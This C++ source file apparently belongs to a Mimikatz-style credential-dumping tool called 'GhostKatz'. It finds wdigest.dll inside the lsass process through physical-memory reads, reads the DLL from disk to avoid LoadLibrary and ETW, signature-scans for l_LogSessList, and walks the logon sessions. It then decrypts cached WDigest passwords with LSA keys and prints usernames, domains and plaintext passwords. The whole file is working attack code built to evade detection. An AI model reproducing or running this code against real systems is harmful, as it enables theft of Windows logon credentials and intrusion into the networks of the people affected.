#include "wdigest.h"
#include "crypto.h"
#include <algorithm>
#include <cwctype>
#include <fstream>

// GhostKatz WDigest signature: cmp rbx, rcx / je
// Preceded by: lea rcx, [rip+disp32] -> disp32 is at pattern[-4]
static const uint8_t WDIGEST_SIG[] = { 0x48, 0x3b, 0xd9, 0x74 };

// ================================================================
// Find wdigest.dll in lsass module list
// ================================================================
static ModuleInfo find_wdigest_module(HANDLE h, uint64_t dtb, uint64_t ep, uint32_t peb_off) {
    uint64_t peb_va = rp(virt_read(h, ep + peb_off, 8).data(), 0);
    auto peb = proc_read(h, dtb, peb_va, 0x20);
    if (peb.size() < 0x20) throw std::runtime_error("Cannot read PEB for wdigest");
    uint64_t ldr = rp(peb.data(), 0x18);

    uint64_t head = ldr + 0x20;
    uint64_t cur = read_ptr(h, dtb, head);
    std::set<uint64_t> seen = { head };

    for (int i = 0; i < 200; ++i) {
        if (seen.contains(cur) || !cur) break;
        seen.insert(cur);
        auto entry = proc_read(h, dtb, cur - 0x10, 0x80);
        if (entry.size() < 0x80) break;

        uint64_t dll_base = rp(entry.data(), 0x30);
        uint32_t dll_size = rd(entry.data(), 0x40);
        uint16_t name_len = rw(entry.data(), 0x48);
        uint64_t name_ptr = rp(entry.data(), 0x50);

        if (name_len && name_ptr) {
            auto raw = proc_read(h, dtb, name_ptr, std::min<uint16_t>(name_len, 512));
            std::wstring name(reinterpret_cast<const wchar_t*>(raw.data()), raw.size() / 2);
            for (auto& c : name) c = static_cast<wchar_t>(std::towlower(c));
            if (name.find(L"wdigest.dll") != std::wstring::npos)
                return ModuleInfo{ .base = dll_base, .size = dll_size };
        }
        cur = rp(entry.data(), 0x10);
    }
    throw std::runtime_error("wdigest.dll not found in lsass module list");
}

// ================================================================
// Read DLL from disk as raw bytes (no LoadLibrary, no ETW)
// ================================================================
static Bytes read_dll_from_disk(const wchar_t* dll_name) {
    wchar_t sys_dir[MAX_PATH]{};
    GetSystemDirectoryW(sys_dir, MAX_PATH);
    std::wstring path = std::wstring(sys_dir) + L"\\" + dll_name;

    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) return {};
    auto size = f.tellg();
    f.seekg(0);
    Bytes data(static_cast<size_t>(size));
    f.read(reinterpret_cast<char*>(data.data()), size);
    return data;
}

// ================================================================
// PE section parsing for raw file bytes
// ================================================================
struct SectionInfo {
    uint32_t virtual_address;  // RVA when loaded
    uint32_t virtual_size;
    uint32_t raw_offset;       // Offset in file
    uint32_t raw_size;
};

static SectionInfo find_text_section(const Bytes& pe) {
    if (pe.size() < 0x200) return {};
    uint32_t pe_off = rd(pe.data(), 0x3C);
    if (pe_off + 0x18 > pe.size()) return {};

    uint16_t nsec = rw(pe.data(), pe_off + 6);
    uint16_t opt_hdr_size = rw(pe.data(), pe_off + 0x14);
    uint32_t sec_start = pe_off + 0x18 + opt_hdr_size;

    for (uint16_t i = 0; i < nsec; ++i) {
        uint32_t s = sec_start + i * 40;
        if (s + 40 > pe.size()) break;
        if (std::memcmp(pe.data() + s, ".text", 5) == 0) {
            return {
                .virtual_address = rd(pe.data(), s + 12),
                .virtual_size    = rd(pe.data(), s + 8),
                .raw_offset      = rd(pe.data(), s + 20),
                .raw_size        = rd(pe.data(), s + 16),
            };
        }
    }
    return {};
}

// ================================================================
// Extract WDigest credentials
// ================================================================
std::vector<WDigestCredential> extract_wdigest_creds(
    HANDLE h, uint64_t dtb,
    uint64_t lsass_eprocess, uint32_t peb_offset,
    const LsaKeys& keys)
{
    // Find wdigest.dll in lsass
    std::cout << "[*] Finding wdigest.dll in lsass...\n";
    auto wmod = find_wdigest_module(h, dtb, lsass_eprocess, peb_offset);
    std::cout << std::format("  wdigest.dll base={:#x} size={:#x}\n", wmod.base, wmod.size);

    // Read wdigest.dll from disk as raw bytes
    auto dll_bytes = read_dll_from_disk(L"wdigest.dll");
    if (dll_bytes.size() < 0x1000) {
        std::cerr << "[-] Cannot read wdigest.dll from System32\n";
        return {};
    }

    auto text = find_text_section(dll_bytes);
    if (!text.raw_size || text.raw_offset + text.raw_size > dll_bytes.size()) {
        std::cerr << "[-] Cannot find .text section in wdigest.dll\n";
        return {};
    }

    // Scan .text raw bytes for signature (need 4 bytes before match for disp32)
    const uint8_t* text_raw = dll_bytes.data() + text.raw_offset;
    uint32_t sig_off = 0;
    for (uint32_t i = 4; i + sizeof(WDIGEST_SIG) <= text.raw_size; ++i) {
        if (std::memcmp(text_raw + i, WDIGEST_SIG, sizeof(WDIGEST_SIG)) == 0) {
            sig_off = i;
            break;
        }
    }
    if (sig_off == 0) {
        std::cerr << "[-] WDigest l_LogSessList signature not found\n";
        return {};
    }

    // RIP-relative resolution on raw file bytes:
    //
    //   lea rcx, [rip + disp32]   ; 48 8d 0d [4 bytes disp]
    //   cmp rbx, rcx              ; 48 3b d9   <-- sig match at sig_off
    //   je  ...                   ; 74 xx
    //
    // disp32 sits at text_raw[sig_off - 4]
    // When loaded, RIP at execution = sig_rva (address of cmp instruction)
    // sig_rva = text.virtual_address + sig_off
    // target_rva = sig_rva + disp32
    // target_in_lsass = wdigest_base + target_rva

    int32_t disp;
    std::memcpy(&disp, text_raw + sig_off - 4, 4);

    uint32_t sig_rva = text.virtual_address + sig_off;
    uint32_t target_rva = static_cast<uint32_t>(static_cast<int32_t>(sig_rva) + disp);
    uint64_t list_head = wmod.base + target_rva;

    std::cout << std::format("  l_LogSessList at {:#x} (RVA={:#x})\n", list_head, target_rva);

    // Verify list is mapped
    auto test_read = proc_read(h, dtb, list_head, 8);
    if (test_read.size() < 8 ||
        std::all_of(test_read.begin(), test_read.end(), [](uint8_t b) { return b == 0; })) {
        std::cout << "  WDigest: l_LogSessList not mapped (WDigest caching may be disabled or no logon since enable)\n";
        return {};
    }

    // Walk l_LogSessList linked list
    // +0x00: Flink, +0x08: Blink
    // +0x30: Username (UNICODE_STRING)
    // +0x40: Domain   (UNICODE_STRING)
    // +0x50: Password (UNICODE_STRING, 3DES encrypted)
    uint64_t flink = rp(test_read.data(), 0);
    std::vector<WDigestCredential> results;
    std::set<uint64_t> seen;

    while (flink && flink != list_head && !seen.contains(flink) && seen.size() < 200) {
        seen.insert(flink);

        auto entry = proc_read(h, dtb, flink, 0x70);
        if (entry.size() < 0x60) break;

        auto user = read_ustr(h, dtb, entry.data(), 0x30);
        auto domain = read_ustr(h, dtb, entry.data(), 0x40);

        if (!user.empty() && !domain.empty()) {
            uint16_t pw_max_len = rw(entry.data(), 0x52);
            uint16_t pw_len = rw(entry.data(), 0x50);
            uint64_t pw_ptr = rp(entry.data(), 0x58);

            if (pw_max_len > 0 && pw_len > 0 && pw_ptr) {
                auto enc_pw = proc_read(h, dtb, pw_ptr, pw_max_len);
                if (!enc_pw.empty()) {
                    // Pad to 8-byte alignment for 3DES
                    if (enc_pw.size() % 8 != 0)
                        enc_pw.resize((enc_pw.size() + 7) & ~7ULL, 0);

                    auto dec = lsa_decrypt(enc_pw, keys.aes_key, keys.des_key, keys.iv);
                    if (!dec.empty()) {
                        dec.push_back(0); dec.push_back(0);
                        std::wstring pw(reinterpret_cast<const wchar_t*>(dec.data()));

                        if (!pw.empty()) {
                            bool is_machine = !user.empty() && user.back() == L'$';
                            if (is_machine) {
                                std::string hex_pw;
                                for (size_t i = 0; i < pw_len && i < dec.size(); ++i)
                                    hex_pw += std::format("{:02x}", dec[i]);
                                results.push_back({ .user = user, .domain = domain,
                                    .password = std::wstring(hex_pw.begin(), hex_pw.end()) });
                            } else {
                                results.push_back({ .user = user, .domain = domain, .password = pw });
                            }
                        }
                    }
                }
            }
        }

        flink = rp(entry.data(), 0);
    }

    return results;
}
